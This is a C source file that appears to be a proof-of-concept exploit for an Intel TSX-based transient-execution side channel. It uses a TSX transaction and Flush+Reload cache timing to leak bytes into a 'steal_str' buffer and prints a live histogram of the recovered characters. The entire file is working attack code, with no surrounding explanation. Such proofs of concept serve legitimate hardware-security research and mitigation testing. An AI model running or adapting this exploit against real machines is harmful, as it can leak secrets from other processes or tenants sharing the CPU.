#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>

#include "cacheutils.h"

#define FROM ' '
#define TO 'z'

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
size_t hist[256];
char steal_str[16];

int recover(void);

int main(int argc, char *argv[])
{
  if (!has_tsx())
  {
    printf("[!] Variant 2 requires a CPU with Intel TSX support!\n");
  }

  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));

  for (size_t i = 0; i < 256; i++)
  {
    flush(mem + i * 4096);
  }

  /* Initialize mapping */
  memset(mapping, 0, 4096);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);
  int locate = 0, ch;
  int attack_success = 0;
  while (true)
  {
    /* Flush mapping */
    flush(mapping);

    /* Begin transaction and recover value */
    if (xbegin() == (~0u))
    {
      maccess(mem + 4096 * mapping[locate]);
      xend();
    }

    ch = recover();
    if (ch != -1)
    {
      attack_success++;
      if (attack_success > 4)
      {
        attack_success = 0;
        steal_str[locate] = ch;
        memset(hist, 0, sizeof(hist));
        locate = locate == (sizeof(steal_str) - 1) ? 0 : locate + 1;
      }
    }
  }

  return 0;
}

int recover(void)
{

  /* Recover value from cache and update histogram */
  bool update = false;
  for (size_t i = FROM; i <= TO; i++)
  {
    if (flush_reload((char *)mem + 4096 * i))
    {
      hist[i]++;
      update = true;
    }
  }

  /* Redraw histogram on update */
  if (update == true)
  {
#ifdef _WIN32
    system("cls");
#else
    printf("\x1b");
#endif

    int max = 1;
    int ch = -1;

    for (int i = FROM; i <= TO; i++)
    {
      if (hist[i] > max)
      {
        max = hist[i];
        ch = i;
      }
    }

    for (int i = FROM; i <= TO; i++)
    {
      printf("%c: (%4u) ", i, (unsigned int)hist[i]);
      for (int j = 0; j < hist[i] * 60 / max; j++)
      {
        printf("#");
      }
      printf("\n");
    }

    for (int i = 0; i < sizeof(steal_str); i++)
    {
      printf("%c", steal_str[i]);
    }
    printf("\n");

    fflush(stdout);
    return ch;
  }
  return -1;
}
